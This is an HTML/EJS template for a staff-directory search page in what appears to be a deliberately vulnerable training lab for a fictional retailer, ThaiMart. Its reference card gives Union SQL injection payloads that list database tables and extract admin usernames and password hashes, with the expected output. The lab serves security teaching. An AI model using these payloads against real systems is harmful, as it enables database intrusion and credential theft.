<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> | ThaiMart</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
  <style>
    .expected-output {
      background: #f0fdf4;
      border: 1px solid #22c55e;
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
    }
    .expected-output h4 {
      color: #166534;
      margin-bottom: 0.75rem;
      font-size: 0.9rem;
    }
    .expected-table {
      font-family: 'Fira Code', monospace;
      font-size: 0.8rem;
      background: #dcfce7;
      padding: 0.75rem;
      border-radius: 6px;
      overflow-x: auto;
      white-space: pre;
      color: #166534;
    }
    .step-card {
      background: white;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 1rem;
      margin-bottom: 1rem;
    }
    .step-card h5 {
      color: var(--primary);
      margin-bottom: 0.5rem;
    }
    .payload-code {
      font-family: 'Fira Code', monospace;
      font-size: 0.85rem;
      background: #1e1e1e;
      color: #d4d4d4;
      padding: 0.75rem;
      border-radius: 6px;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <header class="header">
    <div class="container header-content">
      <a href="/" class="logo">
        <span class="logo-icon">🛒</span>
        <span class="logo-text">ThaiMart</span>
      </a>
      <nav class="nav">
        <a href="/" class="nav-link">หน้าแรก</a>
        <a href="/lab05" class="nav-link active">Staff Directory</a>
      </nav>
      <div class="header-slogan">Internal Portal</div>
    </div>
  </header>

  <div class="page-header">
    <div class="container">
      <h1 class="page-title">Staff Directory</h1>
      <p class="page-subtitle">ค้นหาข้อมูลพนักงาน ThaiMart</p>
    </div>
  </div>

  <main class="main">
    <div class="container page-content">
      <!-- Search Form -->
      <div class="card mb-3">
        <div class="card-body">
          <form action="/lab05" method="GET">
            <div class="search-form">
              <input type="text" name="q" class="search-input" placeholder="ค้นหาชื่อพนักงาน..." value="<%= search %>">
              <button type="submit" class="btn btn-primary search-btn">ค้นหา</button>
            </div>
          </form>
        </div>
      </div>

      <% if (error) { %>
        <div class="alert alert-danger">
          <strong>Database Error:</strong> <%= error %>
        </div>
      <% } %>

      <% if (search) { %>
        <p class="text-muted mb-2">ผลการค้นหา "<%= search %>" - พบ <%= staff.length %> รายการ</p>
      <% } %>

      <!-- Results -->
      <div class="card">
        <div class="card-header">รายชื่อพนักงาน</div>
        <div class="card-body">
          <% if (staff.length > 0) { %>
            <div class="table-container">
              <table class="table">
                <thead>
                  <tr>
                    <th>ID</th>
                    <th>ชื่อ-นามสกุล</th>
                    <th>แผนก</th>
                    <th>ตำแหน่ง</th>
                  </tr>
                </thead>
                <tbody>
                  <% staff.forEach(person => { %>
                    <tr>
                      <td><%= person.id %></td>
                      <td><%= person.name %></td>
                      <td><%= person.department %></td>
                      <td><%= person.position %></td>
                    </tr>
                  <% }) %>
                </tbody>
              </table>
            </div>
          <% } else if (search) { %>
            <p class="text-muted text-center p-3">ไม่พบพนักงานที่ค้นหา</p>
          <% } else { %>
            <p class="text-muted text-center p-3">กรุณากรอกชื่อพนักงานที่ต้องการค้นหา</p>
          <% } %>
        </div>
      </div>

      <!-- Quick Links -->
      <div class="card mt-3">
        <div class="card-header">แผนก</div>
        <div class="card-body">
          <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
            <a href="/lab05?q=IT" class="btn btn-sm btn-outline">IT</a>
            <a href="/lab05?q=Marketing" class="btn btn-sm btn-outline">Marketing</a>
            <a href="/lab05?q=Sales" class="btn btn-sm btn-outline">Sales</a>
            <a href="/lab05?q=HR" class="btn btn-sm btn-outline">HR</a>
            <a href="/lab05?q=Finance" class="btn btn-sm btn-outline">Finance</a>
          </div>
        </div>
      </div>

      <!-- Union SQLi Reference -->
      <div class="card mt-3">
        <div class="card-header">🔍 Union SQL Injection - ผลลัพธ์ที่ควรเห็น</div>
        <div class="card-body">

          <!-- Step 4: List Tables -->
          <div class="step-card">
            <h5>Step 4: ดูรายชื่อตารางในฐานข้อมูล</h5>
            <div class="payload-code">' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--</div>
            <div class="expected-output">
              <h4>✅ ผลลัพธ์ที่ควรเห็น:</h4>
              <div class="expected-table">ID │ ชื่อ-นามสกุล       │ แผนก │ ตำแหน่ง
───┼───────────────────┼──────┼────────
1  │ staff             │ 3    │ 4
1  │ admin_credentials │ 3    │ 4
1  │ playground_products│ 3   │ 4
1  │ seller_accounts   │ 3    │ 4
1  │ categories        │ 3    │ 4
...</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">
                💡 สังเกต: ชื่อตาราง <strong>admin_credentials</strong> ดูน่าสนใจ!
              </p>
            </div>
          </div>

          <!-- Step 6: Extract Credentials -->
          <div class="step-card">
            <h5>Step 6: ดึงข้อมูลจากตาราง admin_credentials</h5>
            <div class="payload-code">' UNION SELECT id,username,password_hash,role FROM admin_credentials--</div>
            <div class="expected-output">
              <h4>✅ ผลลัพธ์ที่ควรเห็น:</h4>
              <div class="expected-table">ID │ ชื่อ-นามสกุล │ แผนก                             │ ตำแหน่ง
───┼─────────────┼──────────────────────────────────┼─────────────
1  │ superadmin  │ e10adc3949ba59abbe56e057f20f883e │ administrator</div>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">
                💡 พบบัญชี <strong>superadmin</strong> พร้อม password hash (MD5)
              </p>
            </div>
          </div>

        </div>
      </div>
    </div>
  </main>

  <footer class="footer">
    <div class="container">
      <div class="footer-content">
        <p class="footer-text">© 2569 ThaiMart Internal Portal</p>
      </div>
    </div>
  </footer>
</body>
</html>
